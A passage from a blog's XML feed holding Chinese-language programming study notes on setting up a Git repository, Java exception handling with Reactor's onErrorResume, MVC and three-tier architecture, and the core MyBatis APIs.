class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># 1. 初始化本地 Git 仓库</span><br>git init<br><br><br><span class="hljs-comment"># 2. 创建 README 文档</span><br>echo <span class="hljs-string">&quot;随便写点东西好了&quot;</span> &gt; README.md<br><br><br><span class="hljs-comment"># 3. 将 README 稳定添加到缓冲取</span><br>git <span class="hljs-keyword">add</span><span class="language-bash"> README.md</span><br><br><br><span class="hljs-comment"># 4. 进行第一次推送（务必进行，相当于点火器）</span><br>git commit -m <span class="hljs-string">&quot;first commit&quot;</span><br><br><br><span class="hljs-comment"># 5. 将当前分支强制重命名为 main</span><br>git branch -M main<br><br><br><span class="hljs-comment"># 6. 本地仓库与远程仓库进行关联。</span><br>git remote <span class="hljs-keyword">add</span><span class="language-bash"> origin https://github.com/wangjia5289/xxxxxx.git</span><br>git remote <span class="hljs-keyword">add</span><span class="language-bash"> origin https://github.com/wangjia5289/myNote.git</span><br><br><span class="hljs-comment"># 7. 进行分支关联（使用 -u 选项，将本地 main 分支与远程 main 分支关联，之后可以直接使用 git push 和 git pull，而无需每次指定远程仓库和分支。）</span><br>git push -u origin main<br><br><br><span class="hljs-comment"># 8. 后续推送</span><br>我们可以通过命令行或使用 GitHub Desktop 等工具来推送代码。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Git 家族</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Java 异常处理</title>
    <link href="/2025/04/11/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
    <url>/2025/04/11/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20250513160838820.png"></p><p>在 <code>mono.onErrorResume(Function&lt;Throwable, Mono&lt;? extends T&gt;&gt; fallback)</code> 中，<code>Throwable</code> 是 Java 中所有错误和异常的父类。它表示一个异常或错误的对象，是所有 <code>Exception</code> 和 <code>Error</code> 类的基类。</p><h3 id="详细解释："><a href="#详细解释：" class="headerlink" title="详细解释："></a>详细解释：</h3><ol><li><p>**<code>Throwable</code>**：</p><ul><li><p><code>Throwable</code> 是 Java 中的所有异常和错误的根类。</p></li><li><p>它分为两大类：</p><ul><li><p>**<code>Error</code>**：通常用于表示 JVM 内部的严重错误，如 <code>OutOfMemoryError</code>，这些一般不被捕获和处理。</p></li><li><p>**<code>Exception</code>**：表示程序中可以捕获和处理的异常。包括受检异常（如 <code>IOException</code>）和运行时异常（如 <code>NullPointerException</code>）。</p></li></ul></li><li><p>你可以把 <code>Throwable</code> 看作一个包含所有错误和异常的容器。</p></li></ul></li><li><p><strong><code>Throwable</code> 在 <code>onErrorResume</code> 中的作用</strong>：</p><ul><li><p><code>onErrorResume</code> 是一个错误处理操作符，它会在 <code>Mono</code> 或 <code>Flux</code> 流中遇到异常时执行。</p></li><li><p><code>Throwable</code> 作为参数传递给你提供的 <code>Function&lt;Throwable, Mono&lt;? extends T&gt;&gt;</code>，表示发生的错误或异常。</p></li><li><p>你可以在这个函数中处理该异常并返回一个替代的 <code>Mono</code>，从而避免流的失败（比如通过返回一个默认值的 <code>Mono</code>）。</p></li></ul></li></ol><h3 id="代码示例："><a href="#代码示例：" class="headerlink" title="代码示例："></a>代码示例：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Mono&lt;String&gt; mono = Mono.fromCallable(() -&gt; &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Oops!&quot;</span>);<br>&#125;);<br><br>mono.onErrorResume(throwable -&gt; &#123;<br>    System.out.println(<span class="hljs-string">&quot;Caught error: &quot;</span> + throwable.getMessage());<br>    <span class="hljs-keyword">return</span> Mono.just(<span class="hljs-string">&quot;Recovered from error&quot;</span>);<br>&#125;).subscribe(System.out::println);<br></code></pre></td></tr></table></figure><ul><li>当 <code>Mono.fromCallable</code> 抛出 <code>RuntimeException</code> 时，<code>onErrorResume</code> 会捕获该异常（即 <code>throwable</code>），并执行提供的函数，返回一个新的 <code>Mono</code>，在该例中返回的是 <code>Mono.just(&quot;Recovered from error&quot;)</code>，从而避免了流的失败。</li></ul><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul><li><p><strong><code>Throwable</code></strong> 是一个非常广泛的基类，涵盖了所有异常和错误类型。</p></li><li><p>在 <code>onErrorResume</code> 中，**<code>Throwable</code>** 表示发生的错误或异常类型，你可以根据它来处理错误并返回一个替代的 <code>Mono</code>。<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E5%BC%82%E5%B8%B8/image-20250411224927524.png"></p></li></ul><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E5%BC%82%E5%B8%B8/image-20250411224723236.png"></p><p>我来回答你的问题，分步骤解释清楚。</p><h3 id="1-抛出一个-RuntimeException，异常消息为-“Oops-”"><a href="#1-抛出一个-RuntimeException，异常消息为-“Oops-”" class="headerlink" title="1. 抛出一个 RuntimeException，异常消息为 “Oops!”"></a>1. 抛出一个 RuntimeException，异常消息为 “Oops!”</h3><p>在 Java 中，抛出一个 <code>RuntimeException</code> 非常简单。你可以使用 <code>throw</code> 关键字，并创建一个 <code>RuntimeException</code> 实例，指定异常消息为 “Oops!”。代码示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Oops!&quot;</span>);<br></code></pre></td></tr></table></figure><p>这段代码会在运行时抛出一个 <code>RuntimeException</code>，并带有消息 “Oops!”。由于 <code>RuntimeException</code> 是非受检异常（unchecked exception），你无需在方法声明中显式声明它，也无需用 <code>try-catch</code> 强制捕获。</p><hr><h3 id="2-常见的异常有哪些？"><a href="#2-常见的异常有哪些？" class="headerlink" title="2. 常见的异常有哪些？"></a>2. 常见的异常有哪些？</h3><p>Java 中有许多常见的异常，有些是开发者在日常编程中经常遇到的。下面列举一些常见的异常及其含义：</p><h4 id="常见的非受检异常（RuntimeException-的子类）"><a href="#常见的非受检异常（RuntimeException-的子类）" class="headerlink" title="常见的非受检异常（RuntimeException 的子类）"></a>常见的非受检异常（RuntimeException 的子类）</h4><ul><li><strong>NullPointerException</strong>：尝试对 <code>null</code> 对象进行操作时抛出，例如调用 <code>null</code> 对象的某个方法。</li><li><strong>ArrayIndexOutOfBoundsException</strong>：访问数组时，索引超出数组范围（例如访问 <code>arr[5]</code> 而数组长度只有 3）。</li><li><strong>IllegalArgumentException</strong>：传递给方法的参数不合法，例如传入负数给需要正数的方法。</li><li><strong>ClassCastException</strong>：尝试将对象强制转换为不兼容的类型，例如将 <code>String</code> 转为 <code>Integer</code>。</li><li><strong>ArithmeticException</strong>：算术运算出错，例如除以零（<code>1 / 0</code>）。</li></ul><h4 id="常见的受检异常（需要显式处理）"><a href="#常见的受检异常（需要显式处理）" class="headerlink" title="常见的受检异常（需要显式处理）"></a>常见的受检异常（需要显式处理）</h4><ul><li><strong>IOException</strong>：输入输出操作出错，例如文件不存在、读取文件失败或权限不足。</li><li><strong>SQLException</strong>：数据库操作出错，例如连接失败或 SQL 语法错误。</li></ul><p>这些异常只是冰山一角，但它们在开发中出现频率较高，值得特别关注。</p><hr><h3 id="3-这些异常都是-Java-自带的吗？还是框架有一些异常？"><a href="#3-这些异常都是-Java-自带的吗？还是框架有一些异常？" class="headerlink" title="3. 这些异常都是 Java 自带的吗？还是框架有一些异常？"></a>3. 这些异常都是 Java 自带的吗？还是框架有一些异常？</h3><ul><li><strong>Java 自带的异常</strong>：上述提到的 <code>NullPointerException</code>、<code>ArrayIndexOutOfBoundsException</code>、<code>IllegalArgumentException</code>、<code>ClassCastException</code>、<code>ArithmeticException</code>、<code>IOException</code> 和 <code>SQLException</code> 都是 Java 标准库自带的，定义在 <code>java.lang</code>、<code>java.io</code> 或 <code>java.sql</code> 等包中。这些异常由 Java 核心 API 提供，适用于通用的编程场景。</li><li><strong>框架特定的异常</strong>：除了 Java 自带的异常，许多框架会定义自己的异常类，以适应特定需求。例如：<ul><li><strong>Spring 框架</strong>：提供了 <code>DataAccessException</code>，用于封装数据库操作中的异常。</li><li><strong>Hibernate</strong>：有 <code>HibernateException</code>，用于处理 ORM（对象关系映射）相关的错误。<br>这些框架异常通常是对 Java 标准异常的扩展或封装，方便开发者在特定上下文中使用。</li></ul></li></ul><p>因此，异常来源可以分为两类：Java 自带的通用异常和框架定义的特定异常。</p><hr><h3 id="4-异常那么多，我怎么记啊？"><a href="#4-异常那么多，我怎么记啊？" class="headerlink" title="4. 异常那么多，我怎么记啊？"></a>4. 异常那么多，我怎么记啊？</h3><p>面对种类繁多的异常，记住所有异常确实不现实，也没必要。以下是一些实用的建议，帮助你掌握和记忆异常：</p><h4 id="理解异常的分类和层次"><a href="#理解异常的分类和层次" class="headerlink" title="理解异常的分类和层次"></a>理解异常的分类和层次</h4><p>Java 的异常体系是一个树状结构：</p><ul><li><strong>Throwable</strong>：所有异常和错误的根类。<ul><li><strong>Error</strong>：表示严重问题（如 <code>OutOfMemoryError</code>），通常不由程序处理。</li><li><strong>Exception</strong>：表示可处理的异常。<ul><li><strong>RuntimeException</strong>：非受检异常，运行时抛出。</li><li><strong>其他 Exception</strong>：受检异常，编译时要求处理。</li></ul></li></ul></li></ul><p>理解这个层次结构，能帮助你快速定位异常的类型和处理方式。</p><h4 id="重点记忆常见异常"><a href="#重点记忆常见异常" class="headerlink" title="重点记忆常见异常"></a>重点记忆常见异常</h4><p>优先记住开发中高频出现的异常，例如：</p><ol><li><code>NullPointerException</code>（空指针）</li><li><code>ArrayIndexOutOfBoundsException</code>（数组越界）</li><li><code>IllegalArgumentException</code>（非法参数）</li><li><code>IOException</code>（输入输出错误）</li><li><code>SQLException</code>（数据库错误）</li></ol><p>这些异常涵盖了大部分常见错误场景，熟悉它们就能应对大多数情况。</p><h4 id="根据场景记忆"><a href="#根据场景记忆" class="headerlink" title="根据场景记忆"></a>根据场景记忆</h4><p>异常通常与特定操作相关联。例如：</p><ul><li>操作数组时，可能遇到 <code>ArrayIndexOutOfBoundsException</code>。</li><li>访问数据库时，可能遇到 <code>SQLException</code>。</li><li>处理文件时，可能遇到 <code>IOException</code>。</li></ul><p>在实际开发中，结合上下文理解异常的触发条件，记忆会更自然。</p><h4 id="查阅文档和实践"><a href="#查阅文档和实践" class="headerlink" title="查阅文档和实践"></a>查阅文档和实践</h4><ul><li><strong>Java 自带异常</strong>：查阅 Java API 文档（如 <code>java.lang.RuntimeException</code> 的子类列表）。</li><li><strong>框架异常</strong>：使用框架时，阅读其官方文档，了解特定异常及其处理建议。</li><li><strong>实践</strong>：通过编写代码、调试和处理异常，积累经验，逐渐熟悉。</li></ul><h4 id="不必强行记住所有异常"><a href="#不必强行记住所有异常" class="headerlink" title="不必强行记住所有异常"></a>不必强行记住所有异常</h4><p>异常种类繁多，且新框架可能引入新异常。关键是掌握异常处理的基本原则（捕获、抛出、日志记录等），遇到不熟悉的异常时，知道如何查资料和解决问题。</p><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>抛出 <code>RuntimeException</code> 的代码是：<code>throw new RuntimeException(&quot;Oops!&quot;);</code>。</li><li>常见异常包括 <code>NullPointerException</code>、<code>ArrayIndexOutOfBoundsException</code>、<code>IOException</code> 等。</li><li>异常既有 Java 自带的，也有框架定义的。</li><li>记忆异常的策略：理解分类、重点记忆常见异常、结合场景、查阅文档并通过实践积累经验。</li></ul><p>希望这些解答对你有帮助！如果还有疑问，欢迎继续提问。</p><h3 id="如何找异常"><a href="#如何找异常" class="headerlink" title="如何找异常"></a>如何找异常</h3><p>以下面这段代码为例，当我们使用第三方库、调用别人提供的方法时，经常会遇到一个问题：我怎么知道它可能抛出哪些异常？而我又该怎么处理这些异常？<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20250513192340373.png"></p><p>其实非常简单，我们只需要把鼠标悬停在方法名上，IDEA 会自动提示这个方法可能抛出的异常类型：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20250513192712609.png"></p><p>如果你想进一步确认，还可以按住 <code>Ctrl</code> 并点击方法名，进入该方法的源码，查看它<strong>显式抛出了哪些异常</strong>：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20250513192840306.png"></p><p>当你搞清楚了可能出现的异常，就可以进行异常处理。当然，也不用自己去写一堆 try-catch：只要选中方法，按下 <code>Ctrl + Alt + T</code>，IDEA 会自动帮你生成完整的 try-catch 模板：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20250513193033722.png"></p><p>然后我们的代码就可以像这样，每种异常你都可以单独处理，灵活掌控：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20250513193745547.png"></p><p>不过，如果你暂时不打算对每个异常做精细化区分，也可以只 catch 顶层的 <code>Exception</code>，然后简单打印下异常信息作为兜底处理：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">&quot;/bucketExists&quot;</span>)<br>public Boolean <span class="hljs-built_in">bucketExists</span>(<span class="hljs-variable">@RequestParam</span> String bucketName) &#123;<br>    <span class="hljs-selector-tag">try</span> &#123;<br>        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">minioClient</span><span class="hljs-selector-class">.bucketExists</span>(<br>            BucketExistsArgs.<span class="hljs-built_in">builder</span>().<span class="hljs-built_in">bucket</span>(bucketName).<span class="hljs-built_in">build</span>()<br>        );<br>    &#125; <span class="hljs-selector-tag">catch</span> (Exception e) &#123;<br>    <br>        <span class="hljs-comment">// 通知、告警</span><br>        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">&quot;查询 bucket 时出错：&quot;</span> + e.<span class="hljs-built_in">getMessage</span>());<br><br>        <span class="hljs-comment">// 返回一个安全默认值</span><br>        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>我调用别人的方法，别人的方法把异常都抛出来了，我知道应该去处理哪些异常，可是我肯定不能一直调用别人的方法，自己不写方法吧，那我自己封装方法，我怎么知道可能会出现哪些异常、怎么抛异常、怎么知道我抛出的异常是不是和系统中已存在的异常交叠</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>异常处理</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：MVC 与三层架构</title>
    <link href="/2025/04/11/%E7%AC%94%E8%AE%B0%EF%BC%9AMVC%20%E4%B8%8E%E4%B8%89%E5%B1%82%E6%9E%B6%E6%9E%84/"/>
    <url>/2025/04/11/%E7%AC%94%E8%AE%B0%EF%BC%9AMVC%20%E4%B8%8E%E4%B8%89%E5%B1%82%E6%9E%B6%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<p>MVC（Model-View-Controller）是一种常用的软件设计模式，通过将应用程序分为三个主要部分——模型（Model）、视图（View）和控制器（Controller），实现了代码的分离，从而提高了应用的可维护性、可扩展性和可测试性。</p><ol><li>&#x3D;&#x3D;模型（M）&#x3D;&#x3D;：负责应用程序的业务逻辑和数据处理，通常包括以下两个层次：<ol><li><font color="#00b0f0">Service 层</font>：处理具体的业务逻辑和数据管理。</li><li><font color="#00b0f0">DAO 层</font>：负责与数据库进行交互，通常使用 JDBC 或 ORM 框架（如 Hibernate、MyBatis）进行数据持久化操作。</li></ol></li><li>&#x3D;&#x3D;视图（V）&#x3D;&#x3D;：负责数据的呈现和用户界面的展示，通常无需关注业务逻辑，仅关注如何展现数据。<ol><li>在传统的 Java Web 应用中，JSP 用于动态生成 HTML 页面。</li><li>在现代前端应用中，框架如 React、Vue 或 Angular 通常负责构建用户界面，开发者更多关注前端交互逻辑。</li></ol></li><li>&#x3D;&#x3D;控制器（C）&#x3D;&#x3D;：MVC 的核心部分，负责协调模型层和视图层之间的交互。通常包括以下组件：<ol><li><font color="#00b0f0">控制器（Servlet）</font>：处理 HTTP 请求，调用模型层的业务逻辑，并返回 HTTP 响应。</li><li><font color="#00b0f0">过滤器（Filter）</font>：在请求到达控制器之前进行预处理，如身份验证或日志记录。</li><li><font color="#00b0f0">监听器（Listener）</font>：监控应用程序或请求生命周期中的事件，如上下文初始化、销毁等。</li></ol></li></ol><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMVC%20%E4%B8%8E%E4%B8%89%E5%B1%82%E6%9E%B6%E6%9E%84/image-20250411213131995.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>Service 接口本身不需要添加 <code>@Service</code>，只需要在 ServiceImpl 上添加</li><li>同样的，Dao 接口本身不需要添加 <code>@Repository</code>，只需要在 DaoImpl 上添加，可由于代理的使用，我们可以选择在 Dao 接口本身添加，或者直接不添加。</li><li>不要忘了，实现类要去实现接口，要 <code>implements</code></li></ol></blockquote>]]></content>
    
    
    <categories>
      
      <category>设计模式</category>
      
      <category>MVC 与三层架构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Spring Data MyBatis</title>
    <link href="/2025/04/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20MyBatis/"/>
    <url>/2025/04/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20MyBatis/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1-导图：Map：Spring-Data-MyBatis"><a href="#1-导图：Map：Spring-Data-MyBatis" class="headerlink" title="1. 导图：Map：Spring Data MyBatis"></a>1. 导图：<a href="Map%EF%BC%9ASpringDataMyBatis.xmind">Map：Spring Data MyBatis</a></h3><hr><h3 id="2-MyBatis-概述"><a href="#2-MyBatis-概述" class="headerlink" title="2. MyBatis 概述"></a>2. MyBatis 概述</h3><p>在传统的 JDBC 编程中，SQL 语句与 Java 代码紧密结合，导致代码结构复杂且难以维护。而 MyBatis 是一个用于简化数据库操作的持久层框架，它将 SQL 语句与 Java 代码分离，<strong>通过 XML 或注解的方式将 SQL 语句与 Java 方法映射在一起</strong>。</p><p>与 Hibernate 等 ORM 框架相比，MyBatis 更加灵活，适合对 SQL 有更高要求的场景。</p><hr><h3 id="3-MyBatis-核心-API"><a href="#3-MyBatis-核心-API" class="headerlink" title="3. MyBatis 核心 API"></a>3. MyBatis 核心 API</h3><h4 id="3-1-核心-API-种类"><a href="#3-1-核心-API-种类" class="headerlink" title="3.1. 核心 API 种类"></a>3.1. 核心 API 种类</h4><p>MyBatis 中的核心 API 有：SqlSessionFactoryBuilder  -&gt;  SqlSessionFactory  -&gt;  SqlSession -&gt; Mapper 接口代理对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. SqlSessionFactoryBuilder</span><br><span class="hljs-type">SqlSessionFactoryBuilder</span> <span class="hljs-variable">sqlSessionFactoryBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionFactoryBuilder</span>();<br><br><br><span class="hljs-comment">// 2. SqlSessionFactory</span><br><span class="hljs-comment">// 2.1. 读取 MyBatis 全局配置文件</span><br><span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> Resources.getResourceAsStream(<span class="hljs-string">&quot;mybatis-config.xml&quot;</span>); <br><br><span class="hljs-comment">// 2.2. 以默认环境创建 sqlSessionFactory</span><br><span class="hljs-type">SqlSessionFactory</span> <span class="hljs-variable">sqlSessionFactory</span> <span class="hljs-operator">=</span> sqlSessionFactoryBuilder.build(is);<br><br><span class="hljs-comment">// 2.3. 以指定环境创建 sqlSessionFactory</span><br><span class="hljs-type">SqlSessionFactory</span> <span class="hljs-variable">sqlSessionFactory</span> <span class="hljs-operator">=</span> sqlSessionFactoryBuilder.build(is,<span class="hljs-string">&quot;环境id&quot;</span>);<br><br> <br><span class="hljs-comment">// 3. SqlSession</span><br><span class="hljs-comment">// 3.1. 以关闭自动提交模式，开启事务管理的方式</span><br><span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();              <br><br><span class="hljs-comment">// 3.2. 以自动提交的方式</span><br><span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession(<span class="hljs-literal">true</span>);<br><br><br><span class="hljs-comment">// 4. Mapper 接口代理对象</span><br><span class="hljs-type">UserMapper</span> <span class="hljs-variable">userMapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(UserMapper.class);<br></code></pre></td></tr></table></figure><hr><h4 id="3-2-SqlSessionFactoryBuilder"><a href="#3-2-SqlSessionFactoryBuilder" class="headerlink" title="3.2. SqlSessionFactoryBuilder"></a>3.2. SqlSessionFactoryBuilder</h4><p><code>SqlSessionFactoryBuilder</code> 的主要职责是通过调用 <code>build</code> 方法读取 MyBatis 的全局配置文件，基于这些配置信息创建并返回一个 <code>SqlSessionFactory</code> 实例。</p><p>简单来说，<code>SqlSessionFactoryBuilder</code> 会加载整个配置文件，并根据文件中指定的某个环境信息，创建一个相应的 <code>SqlSessionFactory</code> 对象。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>SqlSessionFactory</code> 实例创建完成后，<code>SqlSessionFactoryBuilder</code> 实例就没有什么用处了。</li><li><code>SqlSessionFactoryBuilder</code> 是不可重用的，每次需要创建一个新的 <code>SqlSessionFactory</code> 时，都必须实例化一个新的 <code>SqlSessionFactoryBuilder</code>。</li><li>通常情况下，应用程序只需要在启动时创建一个 <code>SqlSessionFactory</code> 实例，然后在整个应用程序的生命周期中重用该实例。<code>SqlSessionFactory</code> 是线程安全的，并且可以在多线程环境下重用，因此不需要为每个数据库操作创建新的 <code>SqlSessionFactory</code> 实例。</li></ol></blockquote><hr><h4 id="3-3-SqlSessionFactory"><a href="#3-3-SqlSessionFactory" class="headerlink" title="3.3. SqlSessionFactory"></a>3.3. SqlSessionFactory</h4><p>一个环境对应一个 <code>SqlSessionFactory</code> 对象。 <code>SqlSessionFactory</code> 的主要职责是通过调用 <code>openSession</code>方法生成的 <code>SqlSession</code> 实例。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>SqlSessionFactory</code> 是线程安全的，通常在应用程序启动时创建一个实例，并在整个应用程序的生命周期中共享。多个线程可以共享同一个 <code>SqlSessionFactory</code> 实例，无需担心并发问题。</li></ol></blockquote><hr><h4 id="3-4-SqlSession"><a href="#3-4-SqlSession" class="headerlink" title="3.4. SqlSession"></a>3.4. SqlSession</h4><p><code>SqlSession</code> 代表与数据库的一次会话，负责在这次会话期间执行数据库操作，其主要职责是：</p><ol><li>&#x3D;&#x3D;执行 SQL 语句&#x3D;&#x3D;：<ol><li>调用 <code>SqlSession</code> 的实例方法可以执行各种 SQL 语句</li><li>例如：<code>inset()、delete()、update()、selectOne()、selectList()、selectMap()</code></li><li>需要注意的是，通常我们并不直接使用 <code>SqlSession</code> 来执行 SQL 语句，而是通过获取代理对象来间接执行 SQL。实际上，代理对象在内部仍然调用了这些方法来执行 SQL 语句。</li></ol></li><li>&#x3D;&#x3D;获取代理对象&#x3D;&#x3D;：<ol><li>获取某个 Mapper 接口的代理对象</li></ol></li><li>&#x3D;&#x3D;控制事务管理&#x3D;&#x3D;：<ol><li>在创建 <code>SqlSession</code> 时，如果传入参数 <code>true</code>，表示该 <code>SqlSession</code> 将采用手动事务管理模式。在这种模式下，事务的提交和回滚需要由开发者显式控制，可以使用 <code>commit()</code> 和 <code>rollback()</code> 方法进行事务管理。如果未传入参数 <code>true</code> ，代表是自动提交事务，需要我们自己控制提交和回滚。</li><li>需要注意的是，上面的描述仅限于 <code>&lt;transactionManager type=&quot;JDBC&quot;&gt;</code>，而对于 <code>Spring Data MyBatis</code>，我们一般是使用 <code>@Transactional</code> 进行声明式事务管理，或者使用 <code>PlatformTransactionManager</code> 进行编程式事务管理</li></ol></li><li>&#x3D;&#x3D;资源管理&#x3D;&#x3D;</li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>SqlSession</code> 不是线程安全的，不能在多个线程中共享同一个 <code>SqlSession</code> 实例。每个线程都应该独立获取 <code>SqlSession</code>，确保并发操作的安全性。</li></ol></blockquote><hr><h4 id="3-5-Mapper-接口的代理对象"><a href="#3-5-Mapper-接口的代理对象" class="headerlink" title="3.5. Mapper 接口的代理对象"></a>3.5. Mapper 接口的代理对象</h4><p>Mapper 接口的代理对象是 MyBatis 为 Mapper 接口自动生成的实现类。以前，我们需要手动实现 <code>Dao</code> 接口并生成 <code>DaoImpl</code> 类，然后通过 <code>DaoImpl</code> 对象调用方法执行 SQL。现在，我们不再需要手动实现 <code>Dao</code>，MyBatis 会自动生成并提供代理对象，直接用于执行 SQL。</p><hr><h3 id="4-MyBatis-中的动态代理"><a href="#4-MyBatis-中的动态代理" class="headerlink" title="4. MyBatis 中的动态代理"></a>4. MyBatis 中的动态代理</h3><p>在传统的 JavaWeb 开发中，Dao 层通常需要先声明一个 <code>Dao</code> 接口，然后创建 <code>DaoImpl</code> 来实现该接口。</p><p>而 MyBatis 通过动态代理机制简化了这一过程。你只需要定义一个 <code>Mapper</code> 接口和对应的 SQL 语句，无需手动实现该接口。MyBatis 会自动生成 <code>Mapper</code> 接口的实现类，并通过动态代理在运行时生成代理对象。</p><p>当你通过 <code>Mapper</code> 接口的代理对象调用方法时，实际上是由 MyBatis 实现类中的相应方法处理这些调用。看似直接执行 SQL 查询，实际上是通过实现类的方法来间接执行的。</p><hr><h3 id="5-MyBatis-事务管理（原生）"><a href="#5-MyBatis-事务管理（原生）" class="headerlink" title="5. MyBatis 事务管理（原生）"></a>5. MyBatis 事务管理（原生）</h3><p>在 MyBatis 中，即使你使用了 Mapper 接口的代理对象来调用 SQL 语句，但是关于事务管理这一方面，还是要由 <code>SqlSession</code> 进行管理</p><p>注意，在原生 MyBatis 开发中，我们确实要这样进行事务管理，但是在 <code>Spring Data MyBatis</code> 中，我们要使用 Spring 提供的事务管理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 声明 SqlSession 时，不传递 <span class="hljs-literal">true</span>，代表手动管理事务</span><br>SqlSession sqlSession = sqlSessionFactory.openSession();<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 提交事务</span><br>sqlSession.commit();<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">3. 回滚事务</span><br>sqlSession.rollback();<br></code></pre></td></tr></table></figure><hr><h3 id="6-Spring-提供的事务管理"><a 